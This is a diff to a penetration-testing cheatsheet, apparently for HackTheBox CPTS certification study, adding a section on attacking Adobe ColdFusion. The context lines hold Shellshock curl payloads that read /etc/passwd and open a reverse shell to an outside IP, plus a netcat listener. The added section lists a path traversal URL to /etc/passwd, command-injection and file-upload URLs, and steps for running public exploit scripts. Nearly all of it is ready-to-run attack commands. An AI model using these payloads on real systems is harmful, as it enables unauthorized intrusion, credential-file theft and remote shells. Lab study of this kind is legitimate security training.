@@ -84,6 +84,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
   	- [PRTG](#prtg)
   	- [GITLAB](#gitlab)
   	- [CGI](#cgi)
+  	- [ColdFusion](#coldFusion)
 - [Useful Resources](#useful-resources)
 
 
@@ -2118,6 +2119,31 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 	- curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
 	- curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.38/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
 	- sudo nc -lvnp 7777
+```
+### ColdFusion
+```
+--> nmap -p- -sC -Pn 10.129.247.30 --open --> 8500/tcp  open  fmtp which is clodfusion ssl default port
+--> To know the version --> /CFIDE/administrator
+
+--> Attacking ColdFusion
+	--> searchsploit adobe coldfusion
+		--> Directory Traversal
+			1) http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en OR http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
+			OR
+			2) searchsploit -p 14641
+				--> cp /usr/share/exploitdb/exploits/multiple/remote/14641.py
+				--> python2 14641.py
+				--> python2 14641.py 10.129.204.230 8500
+		--> RCE
+			1) http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
+			OR
+			2) http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
+			OR
+			3) searchsploit -p 50057
+				--> cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+				--> python3 50057.py 
+			
+
 ```
 ## Useful Resources
 
